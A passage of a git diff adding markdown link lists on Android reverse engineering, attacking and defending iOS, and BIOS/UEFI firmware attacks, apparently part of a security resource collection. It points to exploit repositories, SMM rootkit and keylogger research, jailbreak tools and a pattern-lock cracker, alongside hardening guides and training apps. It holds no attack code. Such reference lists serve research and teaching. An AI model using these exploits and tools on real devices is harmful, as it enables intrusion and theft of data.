+    source code from the compiled binary CLASS files. AndroChef Java Decompiler
+    is able to decompile the most complex Java 6 applets and binaries, producing
+    accurate source code. AndroChef successfully decompiles obfuscated Java 6
+    and Java 7 .class and .jar files. Support Java language features like
+    generics, enums and annotations. According to some studies, AndroChef Java
+    Decompiler is able to decompile 98.04% of Java applications generated with
+    traditional Java compilers- a very high recovery rate. It is simple but
+    powerful tool that allows you to decompile Java and Dalvik bytecode (DEX,
+    APK) into readable Java source. Easy to use.
+
+* [Instrumenting Android Applications with Frida](http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html)
+
+* [smali_emulator](https://github.com/evilsocket/smali_emulator)
+
+  * This software will emulate a smali source file generated by apktool.
+
+* [ARE - Virtual Machine for Android Reverse Engineering](https://redmine.honeynet.org/projects/are)
+
+* [Android Applications Reversing 101](https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101)
+
+* [Android Crackmes](http://www.droidsec.org/wiki/#crack-mes)
+
+* [Hacking Android apps with FRIDA I](https://www.codemetrix.net/hacking-android-apps-with-frida-1/)
+
+* [Want to break some Android apps? - Android Crackmes- Carnal0wnage](http://carnal0wnage.attackresearch.com/2013/08/want-to-break-some-android-apps.html)
+
+* [Dex Education 201 - Anti-Emulation.pdf](https://github.com/strazzere/anti-emulator/blob/master/slides/Dex%20Education%20201%20-%20Anti-Emulation.pdf)
+
+* [List of Android Crackmes](https://forum.tuts4you.com/topic/33057-android-hackmes/)
+
+* [baredroid](https://github.com/ucsb-seclab/baredroid)
+
+  * BareDroid allows for bare-metal analysis on Android devices.
+
+* [Paper](https://www.cs.ucsb.edu/%7Evigna/publications/2015_ACSAC_Baredroid.pdf)
+
+### Interesting Android Papers
+
+* [List of important whitepapers](https://github.com/droidsec/droidsec.github.io/wiki/Android-Whitepapers)
+
+* [Peeking into Your App without Actually Seeing It: UI State Inference and Novel Android Attacks](http://www.cs.ucr.edu/~zhiyunq/pub/sec14_android_activity_inference.pdf)
+
+* [Execute This! Analyzing Unsafe and Malicious Dynamic Code Loading in Android Applications](https://anonymous-proxy-servers.net/paper/android-remote-code-execution.pdf)
+
+* [Rage Against the Droid: Hindering Dynamic analysis of android malware](http://www.syssec-project.eu/m/page-media/3/petsas_rage_against_the_virtual_machine.pdf)
+
+* [APKLancet: Tumor Payload Diagnosis and Purification for Android Applications](http://loccs.sjtu.edu.cn/typecho/usr/uploads/2014/04/1396105336.pdf)
+
+* [DroidRay: A Security Evaluation System for CustomizedAndroid Firmwares](http://www.cs.cuhk.hk/~cslui/PUBLICATION/ASIACCS2014DROIDRAY.pdf)
+
+* [VirtualSwindle: An Automated Attack Against In-App Billing on Android](http://seclab.ccs.neu.edu/static/publications/asiaccs14virtualswindle.pdf)
+
+* [Evading Android Runtime Analysis via Sandbox Detection](https://www.andrew.cmu.edu/user/nicolasc/publications/VC-ASIACCS14.pdf)
+
+* [Enter Sandbox: Android Sandbox Comparison](http://www.mostconf.org/2014/papers/s3p1.pdf)
+
+* [Post-Mortem Memory Analysis of Cold-Booted Android Devices](http://www.homac.de/publications/Post-Mortem-Memory-Analysis-of-Cold-Booted-Android-Devices.pdf)
+
+* [Upgrading Your Android, Elevating My Malware: Privilege Escalation Through Mobile OS Updating](http://www.informatics.indiana.edu/xw7/papers/privilegescalationthroughandroidupdating.pdf)
+
+* [Exploring Android KitKat Runtime](http://www.haxpo.nl/wp-content/uploads/2014/02/D1T2-State-of-the-Art-Exploring-the-New-Android-KitKat-Runtime.pdf)
+
+* [Analyzing Inter-Application Communication in Android](https://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf)
+
+* [Automatically Exploiting Potential Component Leaks in Android Applications](http://orbilu.uni.lu/bitstream/10993/16914/1/tr-pcLeaks.pdf)
+
+* [I know what leaked in your pocket: uncovering privacy leaks on Android Apps with Static Taint Analysis](http://arxiv.org/pdf/1404.7431v1.pdf)
+
+* [Bifocals: Analyzing WebView Vulnerabilities in Android Applications](http://www.eecs.berkeley.edu/~emc/papers/Chin-WISA-WebViews.pdf)
+
+* [Analyzing Android Browser Apps for file:// Vulnerabilities](http://arxiv.org/pdf/1404.4553v3.pdf)
+
+* [FlowDroid: Precise Context, Flow, Field, Object-sensitive and Lifecycle-aware Taint Analysis for Android Apps](http://sseblog.ec-spride.de/wp-content/uploads/2013/05/pldi14submissionFlowdroid.pdf)
+
+* [Detecting privacy leaks in Android Apps](https://publications.uni.lu/bitstream/10993/16916/1/ESSoS-DS2014-Li.pdf)
+
+* [From Zygote to Morula: Fortifying Weakened ASLR on Android](http://www.cc.gatech.edu/~blee303/paper/morula.pdf)
+
+* [Apposcopy: Semantics-Based Detection of Android Malware through Static Analysis](http://www.cs.utexas.edu/~yufeng/papers/fse14.pdf)
+
+* [MAdFraud: Investigating Ad Fraud in Android Applications](http://www.cs.ucdavis.edu/~hchen/paper/mobisys2014.pdf)
+
+* [Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security](http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf)
+
+* [AsDroid: Detecting Stealthy Behaviors in Android Applications by User Interface and Program Behavior Contradiction](https://ece.uwaterloo.ca/~lintan/publications/asdroid-icse14.pdf)
+
+* [NativeGuard: Protecting Android Applications from Third-Party Native Libraries](http://www.cse.lehigh.edu/~gtan/paper/nativeguard.pdf)
+
+* [Into the Droid: Gaining Access to Android User Data](https://www.youtube.com/watch?v=MxhIo95VccI&list=PLCDA5DF85AD6B4ABD)
+
+* [Android Packers](http://www.fortiguard.com/uploads/general/Area41Public.pdf)
+
+* [Xprivacy Android](https://github.com/M66B/XPrivacy#description)
+
+* [An Empirical Study of Cryptographic Misuse in Android Applications](https://www.cs.ucsb.edu/~chris/research/doc/ccs13_cryptolint.pdf)
+
+* [PowerSpy: Location Tracking using Mobile Device Power Analysis](http://arxiv.org/abs/1502.03182)
+
+* [Obfuscation in Android malware, and how to fight back](https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Android-obfuscation)
+
+* [PatchDroid: Scalable Third-Party Security Patches for Android Devices](http://www.mulliner.org/collin/academic/publications/patchdroid.pdf)
+
+  * Android is currently the largest mobile platform with around 750 million
+    devices worldwide. Unfortunately, more than 30% of all devices contain
+    publicly known security vulnera- bilities and, in practice, cannot be
+    updated through normal mechanisms since they are not longer supported by the
+    man- ufacturer and mobile operator. This failure of traditional patch
+    distribution systems has resulted in the creation of a large population of
+    vulnerable mobile devices. In this paper, we present PatchDroid, a system to
+    dis- tribute and apply third-party security patches for Android. Our system
+    is designed for device-independent patch cre- ation, and uses in-memory
+    patching techniques to address vulnerabilities in both native and managed
+    code. We created a fully usable prototype of PatchDroid, including a number
+    of patches for well-known vulnerabilities in Android devices. We evaluated
+    our system on different devices from multiple manufacturers and show that we
+    can effectively patch se- curity vulnerabilities on Android devices without
+    impacting performance or usability. Therefore, PatchDroid represents a
+    realistic path towards dramatically reducing the number of exploitable
+    Android devices in the wild.
+
+* [Dissecting the Android Bouncer](https://www.duosecurity.com/blog/duo-tech-talks-dissecting-the-android-bouncer)
+
+### Educational Material
+
+* [OWASP GoatDroid](https://www.owasp.org/index.php/Projects/OWASP_GoatDroid_Project)
+
+  * OWASP GoatDroid is a fully functional and self-contained training
+    environment for educating developers and testers on Android security.
+    GoatDroid requires minimal dependencies and is ideal for both Android
+    beginners as well as more advanced users. The project currently includes two
+    applications: FourGoats, a location-based social network, and Herd
+    Financial, a mobile banking application. There are also several feature that
+    greatly simplify usage within a training environment or for absolute
+    beginners who want a good introduction to working with the Android platform.
+
+* [Insecure Bank v2](https://github.com/dineshshetty/Android-InsecureBankv2)
+
+  * This vulnerable Android application is named "InsecureBankv2" and is made
+    for security enthusiasts and developers to learn the Android insecurities by
+    testing this vulnerable application. Its back-end server component is
+    written in python. The client component i.e. the Android InsecureBank.apk
+    can be downloaded along with the source code.
+
+* [Put a Sock(et) in it: Understanding and Attacking Sockets on Android](http://www.irongeek.com/i.php?page=videos/bsidesnashville2016/r04-put-a-socket-in-it-understanding-and-attacking-sockets-on-android-jake-valletta)
+
+  * You're probably wondering how someone could possibly fill a 45 minute slot
+    talking about the security implications of sockets (after all, there are
+    only TCP and UDP sockets, right?). In reality, there are several unique
+    types of sockets used by an Android device. These range from network sockets
+    (the ones we are all familiar with), to local sockets, and even kernel-level
+    sockets. When used improperly, these sockets can have devastating effects on
+    the overall security of a device. In this talk, I'll discuss several types
+    of Linux-based sockets found on Android devices and how these sockets have
+    historically been used to compromise devices. I'll also provide the tools
+    and techniques necessary to enumerate and interact with these sockets on
+    your own device.
+
+* [Android apps in sheep's clothing](http://www.modzero.ch/modlog/archives/2015/04/01/android_apps_in_sheeps_clothing/index.html)
+
+  * We identified a security weakness in Android's approach of handling UI
+    elements, circumventing parts of Android's sandboxing approach. While this
+    attack is simple from a technical point of view, the impact of exploiting
+    such a vulnerability is significant. It affects Android based devices as
+    well as Blackberry mobile devices running the Android runtime environment.
+
+### Write-ups
+
+* [Inside the Android Play Service's magic OAuth flow](http://sbktech.blogspot.com/2014/01/inside-android-play-services-magic.html)
+
+  * Owning google accounts on Android devices
+
+* [Security enhancements in android through its versions](www.androidtamer.com)
+
+* [Understanding the Android bytecode](https://mariokmk.github.io/programming/2015/03/06/learning-android-bytecode.html)
+
+  * Writeup on reversing/understanding Android Bytecode
+
+* [ClockLockingBeats](https://github.com/monk-dot/ClockLockingBeats)
+
+  * Repo for the DARPA CFT / Clock Locking Beats project. Exploring Android
+    kernel and processor interactions to hide running threads
+
+* [Hacking Android phone. How deep the rabbit hole goes.](https://hackernoon.com/hacking-android-phone-how-deep-the-rabbit-hole-goes-18b62ad65727#.txib8od0m)
+
+* [Android Bytecode Obfuscation - Patrick Schulz 2012](http://dexlabs.org/blog/bytecode-obfuscation)
+
+* [Android Pattern Lock Cracker](https://github.com/sch3m4/androidpatternlock)
+
+* A little Python tool to crack the Pattern Lock on Android devices
+
+### Books
+
+* Android Hackers Handbook
+* Android System Security Internals
+
+### Other
+
+* [Android-x86 Project - Run Android on Your PC](http://www.android-x86.org/)
+
+  * This is a project to port Android open source project to x86 platform,
+    formerly known as "patch hosting for android x86 support". The original plan
+    is to host different patches for android x86 support from open source
+    community. A few months after we created the project, we found out that we
+    could do much more than just hosting patches. So we decide to create our
+    code base to provide support on different x86 platforms, and set up a git
+    server to host it.
+
+* [Root Tools](https://github.com/Stericson/RootTools)
+
+  * RootTools provides rooted developers a standardized set of tools for use in
+    the development of rooted applications.
+
+* [Protect Your Java Code — Through Obfuscators And Beyond](https://www.excelsior-usa.com/articles/java-obfuscators.html)
+  [fdroidcl](https://github.com/mvdan/fdroidcl#advantages-over-the-android-clientx)
+
+  * F-Droid desktop client.
+
+* [Heimdall](https://github.com/Benjamin-Dobell/Heimdall)
+
+  * Heimdall is a cross-platform open-source tool suite used to flash firmware
+    (aka ROMs) onto Samsung Galaxy S devices.
+
+* [hbootdbg](https://github.com/sogeti-esec-lab/hbootdbg/)
+
+  * Debugger for HTC phones bootloader (HBOOT).
+
+* [playdrone](https://github.com/nviennot/playdrone)
+
+  * Google Play Crawler
diff --git a/source/Attacking-Defending-iOS.md b/source/Attacking-Defending-iOS.md
new file mode 100644
index 0000000..42c242e
--- /dev/null
+++ b/source/Attacking-Defending-iOS.md
@@ -0,0 +1,182 @@
+## Attacking & Defending iOS
+
+#### TOC
+
+* [Cull](#cull)
+* [Hardening Guides](#harden)
+* [Techniques](#tech)
+* [Training & Tutorials](#train)
+* [Security Testing Methodologies](#test)
+* [General Research Papers](#research)
+* [Reverse Engineering](#re)
+* [Jailbreaking](#jail)
+
+#### Cull
+
+* [iOS 678 Security - A Study in Fail](https://www.syscan.org/index.php/download/get/bec31d45168aa331fc01f84451e11186/SyScan15%20Stefan%20Esser%20-%20iOS%20678%20Security%20-%20A%20Study%20in%20Fail.pdf)
+* [Jailbreak Stories - Cyril Cattiaux(pod2g) - WWJC 2014](https://www.youtube.com/watch?v=OBFLTb-AY38)
+* [Mobile self-defense - Karsten Nohl](https://www.youtube.com/watch?v=GeCkO0fWWqc)
+* [Pentesting iOS Applications - Pentester Academy](http://www.pentesteracademy.com/course?id=2)
+
+  * Paid Course
+  * This course focuses on the iOS platform and application security and is
+    ideal for pentesters, researchers and the casual iOS enthusiast who would
+    like to dive deep and understand how to analyze and systematically audit
+    applications on this platform using a variety of bleeding edge tools and
+    techniques.
+
+* [Mobile Application Penetration Testing Cheat Sheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
+
+### General
+
+* [Hacking Your Way Up The Mobile Stack](http://vimeo.com/51270090)
+
+* [iOS Application Security Review Methodology](http://research.aurainfosec.io/ios-application-security-review-methodology/#snapshot)
+
+* aurainfosec
+
+* [Secure iOS application development](https://github.com/felixgr/secure-ios-app-dev)
+
+  * This guide is a collection of the most common vulnerabilities found in iOS
+    applications. The focus is on vulnerabilities in the applications’ code and
+    only marginally covers general iOS system security, Darwin security,
+    C/ObjC/C++ memory safety, or high-level application security. Nevertheless,
+    hopefully the guide can serve as training material to iOS app developers
+    that want to make sure that they ship a more secure app. Also, iOS security
+    reviewers can use it as a reference during assessments.
+
+* [needle](https://github.com/mwrlabs/needle)
+
+  * Needle is an open source, modular framework to streamline the process of
+    conducting security assessments of iOS apps.
+
+### List of Hardening Guides for iOS
+
+* [Excellent forum post detailing general security practices](https://forum.raymond.cc/threads/hardening-apple-ios-iphone-ipad-ipod.37451/)
+* [Apple’s white paper on their security mechanisms built into iOS](https://images.apple.com/ipad/business/docs/iOS_Security_Feb14.pdf)
+* [University of Texas’s Checklist/Guide to securing iOS](https://wikis.utexas.edu/display/ISO/Apple+iOS+Hardening+Checklist)
+* [Center for Internet Security Guide to securing iOS 7](https://benchmarks.cisecurity.org/tools2/iphone/CIS_Apple_iOS_7_Benchmark_v1.1.0.pdf)
+* [Australian Signals Intel Guide to securing iOS 7](http://www.asd.gov.au/publications/iOS7_Hardening_Guide.pdf)
+* [Excellent forum post detailing general security practices](https://forum.raymond.cc/threads/hardening-apple-ios-iphone-ipad-ipod.37451/)
+* [Guide to hardening iOS with the goal of privacy](http://cydia.radare.org/sec/)
+
+### Vulnerabilities/Exploits
+
+* [List of iOS Exploits](http://theiphonewiki.com/wiki/Category:Exploits)
+
+### Techniques
+
+### Training & Tutorials
+
+* [iOSRE](https://github.com/kpwn/iOSRE)
+
+  * The aim of this project is to provide useful and updated tools and knowledge
+    on iOS reverse engineering and exploitation. This is an ongoing effort, and
+    still in a very new stage.
+
+* [OWASP iOS crackme tutorial: Solved with Frida](https://www.nowsecure.com/blog/2017/04/27/owasp-ios-crackme-tutorial-frida/)
+
+* [Bypassing SSL Cert Pinning in iOS](http://chargen.matasano.com/chargen/2015/1/6/bypassing-openssl-certificate-pinning-in-ios-apps.html)
+* [Learning iOS Application Security - 34 part series - damnvulnerableiosapp](http://damnvulnerableiosapp.com/#learn)
+
+  * iOS app designed to be vulnerable in specific ways to teach security testing
+    of iOS applications.
+
+* [Damn Vulnerable iOS App - Getting Started](http://damnvulnerableiosapp.com/2013/12/get-started/)
+
+* [OWASP iGOAT](https://www.owasp.org/index.php/OWASP_iGoat_Project)
+
+  * iGoat is a safe environment where iOS developers can learn about the major
+    security pitfalls they face as well as how to avoid them. It is made up of a
+    series of lessons that each teach a single (but vital) security lesson.
+
+### iOS Security Testing Methodologies/Tools
+
+* [iPwn Apps: Pentesting iOS Applications - SANS](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
+
+* [iOS Application Security Testing Cheat Sheet](https://www.owasp.org/index.php/IOS_Application_Security_Testing_Cheat_Sheet)
+
+* [idb](https://github.com/dmayer/idb)
+
+  * idb is a tool to simplify some common tasks for iOS pentesting and research.
+    It is still a work in progress but already provides a bunch of (hopefully)
+    useful commands. The goal was to provide all (or most) functionality for
+    both, iDevices and the iOS simulator. For this, a lot is abstracted
+    internally to make it work transparently for both environments. Although
+    recently the focus has been more on supporting devices.
+
+* [idb project page](http://cysec.org/blog/2014/01/23/idb-ios-research-slash-pentesting-tool/)
+
+* [idb - iOS Blackbox Pentesting - Daniel A Meyer](http://matasano.com/research/Introducing_idb_-_Simplified_Blackbox_iOS_App_Pentesting.pdf)
+
+* [idb github page](https://github.com/dmayer/idb)
+
+* [needle](https://github.com/mwrlabs/needle)
+
+* Needle is an open source, modular framework to streamline the process of
+  conducting security assessments of iOS apps.
+
+### General Research Papers
+
+* [Write-up for alloc8: untethered bootrom exploit for iPhone 3GS](https://github.com/axi0mX/alloc8)
+
+### Reverse Engineering
+
+* [IODIDE - The IOS Debugger and Integrated Disassembler Environment](https://github.com/nccgroup/IODIDE)
+* [Clutch - Fast iOS executable dumper](https://github.com/KJCracks/Clutch)
+* [MEMSCAN - Dump iPhone app RAM](http://www.cigital.com/justice-league-blog/2015/02/18/memscan-defined/)
+
+  * A Cigital consultant – Grant Douglas, recently created a utility called
+    MEMSCAN which enables users to dump the memory contents of a given iPhone
+    app. Dumping the memory contents of a process proves to be a useful
+    technique in identifying keys and credentials in memory. Using the utility,
+    users are able to recover keys or secrets that are statically protected
+    within the application but are less protected at runtime. Users can also use
+    the utility to verify that keys and credentials are appropriately disposed
+    of after use.
+
+* [MEMSCAN](https://github.com/hexploitable/MEMSCAN)
+
+  * A memory scanning tool which uses mach_vm to either dump memory or look for
+    a specific sequence of bytes.
+
+* [IOS Reverse Engineering toolkit](https://github.com/S3Jensen/iRET)
+
+### Jailbreaking
+
+* [Guide to hardening iOS with the goal of privacy](http://cydia.radare.org/sec/)
+
+* [IPhoneDevWiki](http://iphonedevwiki.net/index.php/Main_Page)
+
+  * Our goal is to share the sum of all human[1] knowledge about jailbroken iOS
+    development. In other words, this is a collection of documentation written
+    by developers to help each other write extensions (tweaks) for jailbroken
+    iOS, and you're invited to learn from it and contribute to it too.
+
+* [The iPhone Wiki](http://theiphonewiki.com/wiki/Main_Page)
+
+  * The iPhone Wiki is an unofficial wiki dedicated to collecting, storing and
+    providing information on the internals of Apple's amazing iDevices. We hope
+    to pass this information on to the next generation of hackers so that they
+    can go forth into their forebears' footsteps and break the ridiculous bonds
+    Apple has put on their amazing mobile devices.
+
+* [OWASP Jailbreaking Cheat Sheet](https://www.owasp.org/index.php/Mobile_Jailbreaking_Cheat_Sheet)
+
+* [ipwndfu](https://github.com/axi0mX/ipwndfu)
+
+* open-source jailbreaking tool for older iOS devices
+
+### iOS Development
+
+* [imas - Defense for your iOS app - for developers](https://project-imas.github.io/)
+
+### Tools
+
+* [Idb](https://github.com/dmayer/idb)
+
+  * idb is a tool to simplify some common tasks for iOS pentesting and research
+
+### Writeups
+
+* [Write-up for alloc8: untethered bootrom exploit for iPhone 3GS](https://github.com/axi0mX/alloc8)
diff --git a/source/BIOS-UEFI-Attacks-Defenses.md b/source/BIOS-UEFI-Attacks-Defenses.md
new file mode 100644
index 0000000..1703a2a
--- /dev/null
+++ b/source/BIOS-UEFI-Attacks-Defenses.md
@@ -0,0 +1,278 @@
+# Low Level Attacks/Firmware/BIOS/UEFI
+
+TOC
+
+* [General](#general)
+* [Exploitation](#exploit)
+* [Firmware Analysis](#firmware)
+* [Talks & Presentations](#talks)
+* [Tools](#tools)
+* [Papers & Writeups](#papers)
+* [Other](#other)
+
+#### Sort
+
+* [Stoned Vienna](http://www.stoned-vienna.com/)
+
+### What is This Stuff?
+
+* [Official UEFI Site - Specs](http://www.uefi.org/specsandtesttools)
+* [UEFI - OSDev Wiki](http://wiki.osdev.org/UEFI)
+* [Extensible Firmware Interface (EFI) and Unified EFI (UEFI)](http://www.intel.com/content/www/us/en/architecture-and-technology/unified-extensible-firmware-interface/efi-homepage-general-technology.html)
+* [Understanding AMT, UEFI BIOS and Secure boot relationships](https://communities.intel.com/community/itpeernetwork/vproexpert/blog/2013/08/11/understanding-amt-uefi-bios-and-secure-boot-relationships)
+* [Introduction to UEFI](http://x86asm.net/articles/introduction-to-uefi/)
+* [What is Intel Mangement Engine?](http://me.bios.io/ME:About)
+
+### General
+
+* [Timeline of Low level software and hardware attack papers](http://timeglider.com/timeline/5ca2daa6078caaf4)
+* [Technical Overview of Windows UEFI Startup Process](http://news.saferbytes.it/analisi/2013/10/windows-uefi-startup-a-technical-overview/)
+* [Windows UEFI startup – A technical overview](http://news.saferbytes.it/analisi/2013/10/windows-uefi-startup-a-technical-overview/)
+
+  * Through this analysis paper we’ll give a look at Windows 8 (and 8.1) UEFI
+    startup mechanisms and we’ll try to understand their relationship with the
+    underlying hardware platform.
+
+* [Intel ME (Manageability engine) Huffman algorithm](http://io.smashthestack.org/me/)
+* [LEGBACORE Research/Publicatoins](http://www.legbacore.com/Research.html)
+* [Dr Sergei Skorobogatov - Researcher in hardware based attacks, good stuff](https://www.cl.cam.ac.uk/~sps32/)
+* [Disabling Intel ME 11 via undocumented mode - ptsecurity](http://blog.ptsecurity.com/2017/08/disabling-intel-me.html)
+* [Advanced Threat Research - Intel](http://www.intelsecurity.com/advanced-threat-research/index.html)
+
+### Exploitation
+
+* [CHIPSEC module that exploits UEFI boot script table vulnerability](https://github.com/Cr4sh/UEFI_boot_script_expl)
+  [System Management Mode Hack Using SMM for "Other Purposes](http://phrack.org/issues/65/7.html))
+
+  * The research provided in this paper describes in details how to reverse
+    engineer and modify System Management Interrupt (SMI) handlers in the BIOS
+    system firmware and how to implement and detect SMM keystroke logger. This
+    work also presents proof of concept code of SMM keystroke logger that uses
+    I/O Trap based keystroke interception and a code for detection of such
+    keystroke logger.
+
+* [A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers - Filip Wecherowski](http://phrack.org/issues/66/11.html#article)
+
+  * The research provided in this paper describes in details how to reverse
+    engineer and modify System Management Interrupt (SMI) handlers in the BIOS
+    system firmware and how to implement and detect SMM keystroke logger. This
+    work also presents proof of concept code of SMM keystroke logger that uses
+    I/O Trap based keystroke interception and a code for detection of such
+    keystroke logger.
+
+* [Exploiting UEFI boot script table vulnerability](http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html)
+* [Attacking Intel ® Trusted Execution Technology Rafal Wojtczuk and Joanna Rutkowska](https://www.blackhat.com/presentations/bh-dc-09/Wojtczuk_Rutkowska/BlackHat-DC-09-Rutkowska-Attacking-Intel-TXT-slides.pdf)
+* [Attacking UEFI Boot Script](https://frab.cccv.de/system/attachments/2566/original/venamis_whitepaper.pdf)
+
+  * Abstract—UEFI Boot Script is a data structure interpreted by UEFI firmware
+    during S3 resume. We show that on many systems, an attacker with ring0
+    privileges can alter this data structure. As a result, by forcing S3
+    suspend/resume cycle, an attacker can run arbitrary code on a platform that
+    is not yet fully locked. The consequences include ability to overwrite the
+    flash storage and take control over SMM.
+
+* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
+* [20 Ways Past Secure Boot - Job de Haas - Troopers14](https://www.youtube.com/watch?v=74SzIe9qiM8)
+* [Building reliable SMM backdoor for UEFI based platforms](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html)
+* [ThinkPwn](https://github.com/Cr4sh/ThinkPwn)
+
+  * Lenovo ThinkPad System Management Mode arbitrary code execution exploit
+
+* [From SMM to userland in a few bytes](https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/)
+* [Getting Physical: Extreme abuse of Intel based Paging Systems - Part 1](https://blog.coresecurity.com/2016/05/10/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-1/)
+
+### Firmware Analysis
+
+* [An Introduction to Firmware Analysis[30c3]](https://www.youtube.com/watch?v=kvfP7StmFxY)
+
+  * This talk gives an introduction to firmware analysis: It starts with how to
+    retrieve the binary, e.g. get a plain file from manufacturer, extract it
+    from an executable or memory device, or even sniff it out of an update
+    process or internal CPU memory, which can be really tricky. After that it
+    introduces the necessary tools, gives tips on how to detect the processor
+    architecture, and explains some more advanced analysis techniques, including
+    how to figure out the offsets where the firmware is loaded to, and how to
+    start the investigation.
+
+* [Analyzing and Running binaries from Firmware Images - Part 1](http://w00tsec.blogspot.com.br/2013/09/analyzing-and-running-binaries-from.html)
+* [Binwalk](https://github.com/devttys0/binwalk)
+
+  * Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and
+    extracting firmware images.
+
+* [SIMET Box Firmware Analysis: Embedded Device Hacking & Forensics](http://w00tsec.blogspot.com.br/2013/08/simet-box-firmware-analysis-embedded.html)
+* [hw0lat_detector](http://ftp.dei.uc.pt/pub/linux/kernel/people/jcm/hwlat_detector/hwlat-detector-1.0.0.patch)
+
+  * A system hardware latency detector Linux Kernel Module. This patch
+    introduces a new hardware latency detector module that can be used to detect
+    high hardware-induced latencies within the system. It was originally written
+    for use in the RT kernel, but has wider applications.
+
+* Reverse Engineering Router Firmware Writeup - secforce
+
+  * [Part 1](http://www.secforce.com/blog/2014/04/reverse-engineer-router-firmware-part-1/)
+  * [Part 2](http://www.secforce.com/blog/2014/07/reverse-engineer-router-firmware-part-2/)
+
+* [Debug Methodology Under UEFI](http://www.uefi.org/sites/default/files/resources/UEFI_Plugfest_2011Q4_P8_PHX.pdf)
+* [Reverse Engineering UEFI Firmware](https://jbeekman.nl/blog/2015/03/reverse-engineering-uefi-firmware/)
+* [Intel® System Studio – UEFI BIOS Debugging](https://software.intel.com/en-us/articles/intel-system-studio-2014-uefi-bios-debugging)
+* [Debug SPI BIOS after Power Up Sequence](https://software.intel.com/en-us/articles/debug-spi-bios-after-power-up-sequence)
+* [me-tools](https://github.com/skochinsky/me-tools)
+
+  * Tools for working with Intel ME
+
+### Programming
+
+* [UEFI Programming - First Steps](http://x86asm.net/articles/uefi-programming-first-steps/)
+
+### Talks & Presentations
+
+* [BIOS Chronomancy: Fixing the Core Root of Trust for Measurement - BlackHat 2013](https://www.youtube.com/watch?v=NbYZ4UCN9GY)
+* [Hacking Measured Boot and UEFI - Defcon20](https://www.youtube.com/watch?v=oiqcog1sk2E)
+
+  * There's been a lot buzz about UEFI Secure Booting, and the ability of
+    hardware and software manufacturers to lock out third-party loaders (and
+    rootkits). Even the NSA has been advocating the adoption of measured boot
+    and hardware-based integrity checks. But what does this trend mean to the
+    open source and hacker communities? In this talk I'll demonstrate measured
+    boot in action. I'll also be releasing my new Measured Boot Tool which
+    allows you to view Trusted Platform Module (TPM) boot data and identify
+    risks such as unsigned early-boot drivers. And, I'll demonstrate how
+    measured boot is used for remote device authentication. Finally, I'll
+    discuss weaknesses in the system (hint: bootstrapping trust is still hard),
+    what this technology means to the consumerization trend in IT, and what
+    software and services gaps exist in this space for aspiring entrepreneurs.
+
+* [Hardware Backdooring is Practical -Jonathan Brossard](https://www.youtube.com/watch?v=umBruM-wFUw)
+* [Attacking “secure” chips](https://www.youtube.com/watch?v=w7PT0nrK2BE)
+* [Attackin the TPM part 2](https://www.youtube.com/watch?v=h-hohCfo4LA)
+* [Breaking apple touchID cheaply](http://www.ccc.de/en/updates/2013/ccc-breaks-apple-touchid)
+* [Attacks on UEFI Security - Rafal Wojtczuk&Corey Kallenberg](https://bromiumlabs.files.wordpress.com/2015/01/attacksonuefi_slides.pdf)
+* [The Empire Strikes Back Apple – how your Mac firmware security is completely broken](https://reverse.put.as/2015/05/29/the-empire-strikes-back-apple-how-your-mac-firmware-security-is-completely-broken/)
+
+  * Writeup on compromise of UEFI on apple hardware.
+
+* [Bootkit Threats: In Depth Reverse Engineering & Defense- Eugene Rodionov&Aleksandr Matrosov](https://www.eset.com/fileadmin/Images/US/Docs/Business/presentations/conference_papers/REcon2012.pdf)
+* [Attacks on UEFI security, inspired by Darth Venamis's misery and Speed Racer](https://media.ccc.de/browse/congress/2014/31c3_-_6129_-_en_-_saal_2_-_201412282030_-_attacks_on_uefi_security_inspired_by_darth_venamis_s_misery_and_speed_racer_-_rafal_wojtczuk_-_corey_kallenberg.html#video)
+
+  * On modern Intel based computers there exists two powerful and protected code
+    regions: the UEFI firmware and System Management Mode (SMM). UEFI is the
+    replacement for conventional BIOS and has the responsibility of initializing
+    the platform. SMM is a powerful mode of execution on Intel CPUs that is even
+    more privileged than a hypervisor. Because of their powerful positions, SMM
+    and UEFI are protected by a variety of hardware mechanisms. In this talk,
+    Rafal Wojtczuk and Corey Kallenberg team up to disclose several prevalent
+    vulnerabilities that result in SMM runtime breakin as well as arbitrary
+    reflash of the UEFI firmware.
+
+* [Attacking and Defending BIOS in 2015](http://www.intelsecurity.com/advanced-threat-research/content/AttackingAndDefendingBIOS-RECon2015.pdf)
+* [CansecWest2016 Getting Physical: Extreme Abuse of Intel Based Paging Systems](https://github.com/n3k/CansecWest2016_Getting_Physical_Extreme_Abuse_of_Intel_Based_Paging_Systems)
+* [Stoned Bootkit - BH USA09](https://www.blackhat.com/presentations/bh-usa-09/KLEISSNER/BHUSA09-Kleissner-StonedBootkit-SLIDES.pdf)
+* [Attacking Intel BIOS - BHUSA09](https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf)
+* [#root via SMS: 4G access level security assessment](https://conference.hitb.org/hitbsecconf2015ams/materials/D1T1%20-%20T.%20Yunusov%20K.%20Nesterov%20-%20Bootkit%20via%20SMS.pdf)
+* [Using Intel TXT to Attack BIOSes](https://vimeo.com/117156508)
+* [Detecting BadBIOS, Evil Maids, Bootkits and Other Firmware Malware - Paul English and Lee Fisher](https://archive.org/details/seagl-2017)
+
+  * For attackers, platform firmware is the new Software. Most systems include
+    hundreds of firmwares - UEFI or BIOS, PCIe expansion ROMs, USB controller
+    drivers, storage controller host and disk/SSD drivers. Firmware-level hosted
+    malware, bare-metal or virtualized, is nearly invisible to normal security
+    detection tools, has full control of your system, and can often continue
+    running even when the system is "powered off". Security Firms (eg, "Hacking
+    Team" sell UEFI 0days to the highest bidder), and government agencies
